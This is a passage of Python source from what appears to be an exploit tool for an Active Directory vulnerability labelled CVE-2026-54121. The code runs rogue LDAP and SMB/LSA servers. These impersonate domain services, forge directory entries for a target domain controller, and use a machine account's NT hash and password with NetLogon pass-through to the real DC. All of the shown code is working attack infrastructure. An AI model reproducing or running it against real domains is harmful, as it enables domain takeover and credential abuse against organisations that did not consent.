            od: The SearchRequest protocol-op payload.
            rs: Whether responses should be sealed.
        """
        off = 0
        if od[off] != 0x04:
            return
        dl2, off = _dl(od, off + 1)
        bdn = od[off : off + dl2].decode("utf-8", errors="replace")
        if bdn == "":
            self._send(conn, st, _lse(mid, "", self._rootdse()), rs)
            self._send(conn, st, _lsd(mid, 0), rs)
            return
        sam = self.esam or "X$"
        fr = bdn.split(",")[0]
        if "=" in fr:
            cv = fr.split("=", 1)[1]
            sam = cv if cv.endswith("$") else cv + "$"
        self._send(conn, st, _lse(mid, bdn, self._principal(sam)), rs)
        self._send(conn, st, _lsd(mid, 0), rs)

    def _dispatch(
        self, conn: socket.socket, st: ConnState, msg: bytes, rs: bool
    ) -> None:
        """Route a single decoded LDAPMessage to its bind/search handler."""
        mid, tag, od = _plh(msg)
        if tag == 0x60:
            self._handle_bind(conn, st, mid, od, rs)
        elif tag == 0x63:
            self._handle_search(conn, st, mid, od, rs)

    def _client(self, conn: socket.socket) -> None:
        """Serve a single LDAP client: buffer, deframe and dispatch messages.

        Handles both plaintext LDAP PDUs (before the bind seals the channel)
        and the sealed, length-prefixed framing used afterwards.
        """
        conn.settimeout(30)
        st = ConnState()
        buf = b""
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                buf += chunk
                while buf:
                    if not st.sealed:
                        if not buf or buf[0] != 0x30 or len(buf) < 2:
                            break
                        sl, o = _dl(buf, 1)
                        total = o + sl
                        if len(buf) < total:
                            break
                        self._dispatch(conn, st, buf[:total], False)
                        buf = buf[total:]
                    else:
                        if len(buf) < 4:
                            break
                        fl = struct.unpack(">I", buf[:4])[0]
                        if len(buf) < 4 + fl:
                            break
                        framed = buf[4 : 4 + fl]
                        buf = buf[4 + fl :]
                        plain = st.ce.encrypt(framed[16:])
                        p = 0
                        while p < len(plain):
                            if plain[p] != 0x30:
                                break
                            sl2, so = _dl(plain, p + 1)
                            t = so + sl2
                            if p + t > len(plain):
                                break
                            self._dispatch(conn, st, plain[p : p + t], True)
                            p += t
        except Exception as exc:
            logging.debug(f"Rogue LDAP client: {exc!r}")
        finally:
            try:
                conn.close()
            except Exception as exc:
                logging.debug(f"Rogue LDAP client close: {exc!r}")

    def serve(self, bind: str = "0.0.0.0", port: int = 389) -> None:
        """Bind and accept LDAP clients until :meth:`shutdown` is called.

        Args:
            bind: Bind address for the LDAP listener.
            port: TCP port for the LDAP listener.
        """
        logging.debug(f"Rogue LDAP: binding {bind}:{port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((bind, port))
            s.listen(8)
        except OSError as exc:
            logging.warning(f"Rogue LDAP failed to bind {bind}:{port}: {exc}")
            handle_error(is_warning=True)
            s.close()
            return
        self._sock = s
        while not self._stop.is_set():
            try:
                conn, _ = s.accept()
            except OSError:
                break
            threading.Thread(target=self._client, args=(conn,), daemon=True).start()

    def shutdown(self) -> None:
        """Signal the accept loop to stop and close the listening socket."""
        self._stop.set()
        if self._sock is not None:
            try:
                self._sock.close()
            except Exception as exc:
                logging.debug(f"Rogue LDAP shutdown: {exc!r}")


class RogueServer:
    """Orchestrates the rogue SMB/LSA and rogue LDAP listeners for CVE-2026-54121.

    Starts the rogue SMB server (with the attached LSA service) and the rogue
    LDAP server on daemon threads, exposes a readiness probe and a best-effort
    shutdown for the LDAP listener.
    """

    def __init__(
        self,
        listen_address: str,
        domain_dns: str,
        domain_netbios: str,
        domain_sid: str,
        domain_guid: bytes,
        machine_name: str,
        machine_nthash: str,
        machine_password: Optional[str],
        dc_ip: str,
        target_sam: str,
        target_dns: str,
        target_sid: bytes,
        smb_port: int = 445,
        ldap_port: int = 389,
    ) -> None:
        """Initialize the rogue server bundle.

        Args:
            listen_address: Bind IP for the rogue listeners (e.g. ``0.0.0.0``).
            domain_dns: AD DNS domain (used for both DNS and forest in LSA).
            domain_netbios: NetBIOS domain name.
            domain_sid: Canonical domain SID string.
            domain_guid: 16 raw bytes of the domain ``objectGUID``.
            machine_name: Rogue machine ``sAMAccountName`` including ``$``.
            machine_nthash: Hex NT hash of the machine account.
            machine_password: Cleartext machine password (may be None).
            dc_ip: Real DC IP for NetLogon pass-through validation.
            target_sam: Target DC ``sAMAccountName`` including ``$``.
            target_dns: Target DC ``dNSHostName``.
            target_sid: Target DC ``objectSid`` as raw binary.
            smb_port: TCP port for the rogue SMB/LSA listener.
            ldap_port: TCP port for the rogue LDAP listener.
        """
        self.listen_address = listen_address
        self.domain_dns = domain_dns
        self.domain_netbios = domain_netbios
        self.domain_sid = domain_sid
        self.domain_guid = domain_guid
        self.machine_name = machine_name
        self.machine_nthash = machine_nthash
        self.machine_password = machine_password
        self.dc_ip = dc_ip
        self.target_sam = target_sam
        self.target_dns = target_dns
        self.target_sid = target_sid
        self.smb_port = smb_port
        self.ldap_port = ldap_port
        self._ldap: Optional[RogueLDAP] = None
        self._smb_server: Any = None
        self._smb_thread: Optional[threading.Thread] = None
        self._ldap_thread: Optional[threading.Thread] = None

    def _run_smb_lsa(self) -> None:
        """Thread body: build and run the rogue SMB/LSA server (blocks)."""
        try:
            smb = build_smb_lsa(
                bind=self.listen_address,
                port=self.smb_port,
                nb=self.domain_netbios,
                dns=self.domain_dns,
                forest=self.domain_dns,
                guid_le=self.domain_guid,
                sid_s=self.domain_sid,
                cname=self.machine_name,
                chash=self.machine_nthash,
                cpass=self.machine_password,
                cdom=self.domain_dns,
                dcip=self.dc_ip,
            )
        except Exception as exc:
            logging.warning(f"Rogue SMB/LSA failed to start: {exc}")
            handle_error(is_warning=True)
            return
        self._smb_server = smb
        try:
            smb.start()
        except Exception as exc:
            logging.debug(f"Rogue SMB/LSA server stopped: {exc!r}")

    def start(self) -> None:
        """Start the rogue SMB/LSA and rogue LDAP listeners on daemon threads."""
        ldap = RogueLDAP(
            ddns=self.domain_dns,
            dnb=self.domain_netbios,
            cname=self.machine_name,
            chash=self.machine_nthash,
            cdom=self.domain_dns,
            dcip=self.dc_ip,
            tsid_bin=self.target_sid,
            edns=self.target_dns,
            ecn=self.target_sam.rstrip("$"),
            esam=self.target_sam,
        )
        self._ldap = ldap
        self._smb_thread = threading.Thread(target=self._run_smb_lsa, daemon=True)
        self._ldap_thread = threading.Thread(
            target=ldap.serve,
            kwargs={"bind": self.listen_address, "port": self.ldap_port},
            daemon=True,
        )
        self._smb_thread.start()
        self._ldap_thread.start()

    def wait_until_ready(self, timeout: int = 15) -> bool:
        """Poll the local SMB and LDAP ports until both are open or time runs out.

        Args:
            timeout: Maximum number of seconds to poll.

        Returns:
            True when both ports are open, False on timeout.
        """
        for _ in range(timeout):
            if port_ok("127.0.0.1", self.smb_port) and port_ok(
                "127.0.0.1", self.ldap_port
            ):
                return True
            time.sleep(1)
        return False

    def shutdown(self) -> None:
        """Best-effort shutdown of the rogue LDAP and SMB/LSA listeners."""
        if self._ldap is not None:
            self._ldap.shutdown()
        smb = self._smb_server
        if smb is not None and hasattr(smb, "stop"):
            try:
                smb.stop()
            except Exception as exc:
                logging.debug(f"Rogue SMB/LSA shutdown failed: {exc!r}")
